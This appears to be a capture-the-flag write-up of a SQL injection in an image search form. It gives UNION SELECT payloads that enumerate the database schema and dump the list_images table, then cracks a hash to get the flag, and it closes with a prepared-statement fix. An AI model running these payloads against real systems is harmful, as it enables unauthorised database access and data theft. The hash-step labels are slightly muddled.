# 01_Inject_me_img

The GET parameter in the image search form is vulnerable.

## Method

Go to ?page=searchimg.  
In the search field, search `1 AND 1=1`

## How to exploit

In the search field, run `-1 union select null, concat (table_name) from information_schema.tables where table_schema = database ()`  
This will return a table name.  
Then, in the same search field, run `-1 union select null, concat (column_name) from information_schema.columns where table_schema = database ()`  
This will return the column names.  
Lastly, in the search field, run `-1 union select NULL, concat (id, url, title, comment) from list_images`  
This will return the images from the table, with one of the entries being:

```If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46 ```  

MD5 decrypt: `1928e8083cf461a51303633093573c46`  
Follwed by sha256: `albatroz`  
Flag: `F2A29020EF3132E01DD61DF97FD33EC8D7FCD1388CC9601E7DB691D17D4D6188`

## Solution

- Send form as POST request
- Add prepared statements to backend to prevent SQL injection
